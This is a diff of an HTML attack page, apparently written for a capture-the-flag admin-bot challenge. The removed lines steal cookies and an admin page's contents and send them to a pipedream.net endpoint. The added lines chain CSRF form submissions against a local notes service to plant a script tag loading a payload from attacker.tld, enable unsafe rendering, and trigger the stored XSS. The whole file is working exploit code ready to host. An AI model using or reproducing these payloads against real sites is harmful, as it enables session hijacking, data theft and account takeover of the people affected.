@@ -1,31 +1,25 @@
-<!DOCTYPE html>
+<!-- save as attacker.html and host it on e.g. https://attacker.tld/pwn -->
+<!doctype html>
 <html>
-<head>
-    <title>Malicious Page</title>
-    <script>
-        setTimeout(function() {
-            // Send the admin's cookies using XMLHttpRequest
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://eof6994z5mxf31q.m.pipedream.net?cookie=' + document.cookie, true);
-            xhr.send();
-
-            // Perform a CSRF attack to retrieve sensitive data
-            var xhr2 = new XMLHttpRequest();
-            xhr2.open('GET', 'http://localhost/admin.php', true);
-            xhr2.withCredentials = true; // Include cookies
-            xhr2.onreadystatechange = function() {
-                if (xhr2.readyState === 4 && xhr2.status === 200) {
-                    // Send the data to your RequestBin
-                    var xhr3 = new XMLHttpRequest();
-                    xhr3.open('GET', 'https://eof6994z5mxf31q.m.pipedream.net?data=' + encodeURIComponent(xhr2.responseText), true);
-                    xhr3.send();
-                }
-            };
-            xhr2.send();
-        }, 2000); // Wait 2 seconds before executing
-    </script>
-</head>
 <body>
-    <h1>Loading...</h1>
+<!-- 1. CSRF: make the bot create a malicious note -->
+<form id="n" action="http://127.0.0.1:7189/dashboard" method="POST">
+  <input type="hidden" name="content"
+  value='<script src="https://attacker.tld/payload.js"></script>'>
+</form>
+
+<!-- 2. CSRF: turn on “unsafe” rendering -->
+<form id="u" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
+  <input type="hidden" name="id" value="2"> <!-- our note’s id -->
+  <input type="hidden" name="enable" value="1">
+</form>
+
+<script>
+n.submit();               // create the XSS note   (#2)
+setTimeout(() => { u.submit(); }, 600);           // enable unsafe mode
+setTimeout(() => {
+  location = 'http://127.0.0.1:7189/notes/2';     // view it → XSS fires
+}, 1200);
+</script>
 </body>
 </html>
